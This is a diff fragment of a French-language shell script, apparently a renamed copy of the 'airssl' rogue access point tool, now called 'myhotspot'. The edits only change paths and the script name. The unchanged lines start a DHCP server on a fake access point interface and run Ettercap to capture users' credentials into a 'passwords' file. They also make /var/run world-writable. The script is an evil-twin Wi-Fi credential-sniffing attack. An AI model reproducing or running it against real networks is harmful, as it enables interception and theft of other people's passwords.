@@ -113,7 +113,7 @@ chmod 777 /var/run/
 touch /var/run/dhcpd.pid
 chmod 777 /var/run/dhcpd.pid
 chown dhcpd:dhcpd /var/run/dhcpd.pid
-xterm -xrm '*hold: true' -geometry 75x20+1+100 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/airssl/dhcpd.conf" at0 & dchpid=$!
+xterm -xrm '*hold: true' -geometry 75x20+1+100 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/myhotspot/dhcpd.conf" at0 & dchpid=$!
 disown
 sleep 3
 
@@ -124,7 +124,7 @@ sleep 3
 
 # Ettercap
 echo "[+] Configuration et démarrage de Ettercap"
-xterm -xrm '*hold: true' -geometry 73x25+1+300 -T Ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /pentest/wireless/airssl/passwords -i at0 & ettercapid=$!
+xterm -xrm '*hold: true' -geometry 73x25+1+300 -T Ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /pentest/wireless/myhotspot/passwords -i at0 & ettercapid=$!
 disown
 sleep 3
 
@@ -137,7 +137,7 @@ clear
 echo "[+] Initialistion terminée"
 echo
 echo "Si vous n'avez pas aperçu d'erreur(s), le script est fonctionnel et vous devriez voir apparaître le wifi que vous avez créé"
-echo "IMPORTANT : Pressez Y pour quitter, sinon vous pourriez obtenir des erreurs et des dysfonctionnements. Si vous n'avez pas quitter correctement, tapez ./airssl.sh kill"
+echo "IMPORTANT : Pressez Y pour quitter, sinon vous pourriez obtenir des erreurs et des dysfonctionnements. Si vous n'avez pas quitter correctement, tapez ./myhotspot.sh kill"
 read STOP
 
 # Nettoyage
